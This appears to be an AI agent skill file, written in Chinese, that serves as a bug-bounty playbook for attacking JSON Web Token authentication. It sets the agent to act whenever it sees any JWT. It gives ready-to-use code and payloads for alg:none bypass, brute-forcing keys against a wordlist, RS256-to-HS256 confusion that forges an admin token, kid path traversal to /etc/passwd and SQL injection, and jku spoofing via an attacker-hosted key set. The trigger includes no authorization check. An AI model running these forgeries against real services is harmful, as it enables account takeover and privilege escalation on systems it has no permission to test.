---
name: jwt-pwn
description: JWT攻击全武器库——alg:none/弱密钥爆破/算法混淆/KID注入/jku伪造/JWK注入。Use when 看到JWT Token/Authorization Bearer。
---

# JWT 攻击

> 蒸馏自CC挖洞武器库 jwt-attack-playbook（实战验证）

## 快速识别

```bash
# JWT格式：header.payload.signature（三段base64url）
# 解码header
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d 2>/dev/null
# 工具：jwt_tool / PyJWT / jwt.io（本地python）
pip install pyjwt 2>/dev/null
```

## 5大攻击手法

### 1. alg:none（最经典）
```
改header的alg为none + 去掉签名 → {"alg":"none","typ":"JWT"}.{payload}.
# 变体：None/NONE/nOnE，签名部分留空或"."结尾
# 服务端若未校验alg白名单 → 直接绕过
```

### 2. 弱密钥爆破
```bash
# 常见密钥表爆破HS256
python3 -c "
import jwt
token='<JWT>'
for k in open('/usr/share/wordlists/rockyou.txt',errors='ignore'):
    k=k.strip()
    try:
        jwt.decode(token,k,algorithms=['HS256']); print('KEY:',k); break
    except: pass
"
# 常见弱密钥：secret/123456/your-256-bit-secret/test/jwt
```

### 3. 算法混淆（RS256→HS256）
```
服务端用RSA公钥验签，但支持HS256（对称）→ 用公钥当HMAC密钥签名
python3 -c "
import jwt
pub=open('public.pem').read()
print(jwt.encode({'user':'admin'}, pub, algorithm='HS256'))
"
# 前提：拿到公钥（/jwks.json/公钥文件/证书）
```

### 4. KID注入（路径遍历/SQLi）
```
header加"kid":"../../../../dev/null" → 用空密钥
header加"kid":"/etc/passwd" → 用passwd内容当密钥（对称算法）
kid参数可注入SQL → 数据库返回作为密钥
```

### 5. jku/jwk伪造（公钥欺骗）
```
header加"jku":"http://attacker.com/jwks.json" → 服务端拉取攻击者公钥
header内联"jwk":攻击者公钥 → 直接指定
# 前提：服务端不校验jku白名单/不校验jwks来源
```

## 验证流程

```bash
# 1. 解码原token看payload（找可篡改字段：role/user/isAdmin）
# 2. 改payload（user→admin）→ 用原签名 → 服务端是否接受？
# 3. 不接受 → 试alg:none → 试弱密钥 → 试混淆 → 试kid
# 4. 成功判定：响应返回管理员权限内容/状态码变化
```

## 提交要点

- 能提权/越权访问 = 中危-高危
- 弱密钥爆破成功 = 中危（可伪造任意用户）
- 证据：解码前后对比+伪造token+提权响应
